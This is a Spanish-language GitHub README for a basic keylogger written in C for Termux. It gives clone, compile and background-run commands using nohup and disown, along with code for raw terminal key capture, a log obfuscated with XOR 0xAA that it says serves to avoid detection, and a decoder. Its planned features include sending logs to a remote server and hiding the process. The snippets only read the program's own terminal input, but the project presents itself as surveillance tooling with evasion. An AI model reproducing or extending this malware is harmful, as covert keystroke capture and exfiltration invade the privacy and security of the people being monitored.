
   <img src="https://github.com/V1nt3r4/keylogger_tool/blob/main/laptop-with-glowing-screen-table-dark-top-view-copy-space.jpg" />
 
# 🔐 Keylogger en C para Termux

Captura de teclas con cifrado XOR y ejecución en segundo plano

Este proyecto es un keylogger básico en C diseñado para ejecutarse en Termux (Android/Linux). Captura pulsaciones de teclas en tiempo real y las almacena en un archivo cifrado con XOR para evitar detección.

## 📌 Características

- ✅ Captura teclas sin necesidad de presionar Enter.
- ✅ Guarda las teclas en un archivo de log (`log.txt`).
- ✅ Cifra los datos usando XOR (0xAA) para evitar lectura directa.
- ✅ Corre en segundo plano usando `nohup` y `disown`.
- ✅ Descifrado de datos con un programa en C.
- ✅ Filtra caracteres no imprimibles para evitar datos corruptos.

## 📁 Estructura del Proyecto

```plaintext
📂 Keylogger
 ├── keylogger.c   # Captura y cifra teclas
 ├── decrypt.c     # Descifra el archivo log.txt
 ├── README.md     # Documentación del proyecto
 └── log.txt       # Archivo donde se guardan las teclas capturadas
```

## 🔧 Instalación y Uso

### 1️⃣ Clonar el repositorio

    git clone https://github.com/V1nt3r4/keylogger_tool.git
    cd keylogger_tool

### 2️⃣ Compilar el keylogger

    clang keylogger.c -o keylogger

### 3️⃣ Ejecutar el keylogger

    ./keylogger

🔹 Para ejecutarlo en segundo plano:

    nohup ./keylogger > /dev/null 2>&1 &
    disown

🔹 Para detenerlo:

    pkill keylogger

### 4️⃣ Ver el contenido del log (cifrado)

    cat log.txt

### 5️⃣ Descifrar el log

    clang decrypt.c -o decrypt
    ./decrypt

## 📜 Explicación del Código
### 🔹 1️⃣ Captura de teclas (get_key())

    char get_key() {
        struct termios oldt, newt;
        char ch;
        tcgetattr(STDIN_FILENO, &oldt);
        newt = oldt;
        newt.c_lflag &= ~(ICANON | ECHO);
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        ch = getchar();
        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
        return ch;
    }

📌 Lógica:

  Modifica la terminal para desactivar el buffer de línea y eco de caracteres.
    Captura una tecla en tiempo real.
    Restaura la configuración original de la terminal.

### 🔹 2️⃣ Escritura segura en el archivo (log.txt)

    if (isprint(key)) {
    fputc(key ^ XOR_KEY, file);
    fflush(file);
    }

📌 Lógica:

  Filtra caracteres imprimibles para evitar datos corruptos.
    Cifra cada tecla con XOR (^ 0xAA) antes de escribirla en log.txt.
    fflush(file); asegura que los datos se guarden inmediatamente.

### 🔹 3️⃣ Manejo de señales (CTRL+C)

    void handle_exit(int sig) {
        if (file) fclose(file);
        printf("\n[+] Keylogger detenido. Datos guardados en      %s\n", LOG_FILE);
      exit(0);
    }

📌 Lógica:

  Intercepta CTRL+C para evitar que se cierre inesperadamente.
    Cierra correctamente el archivo log.txt antes de salir.

### 🔹 4️⃣ Descifrado de datos (decrypt.c)

    int ch;
    while ((ch = fgetc(file)) != EOF) {
    putchar(ch ^ XOR_KEY); // XOR inverso
    }

📌 Lógica:

  Lee cada carácter del archivo log.txt.
    Aplica XOR inverso (^ 0xAA) para recuperar las teclas originales.
    Muestra el resultado en pantalla.


## 🎯 Mejoras Futuras

🔹 Enviar logs cifrados a un servidor remoto.
🔹 Mejor manejo de procesos y ocultación.
🔹 Soporte para capturar teclas especiales (Shift, Enter).
 
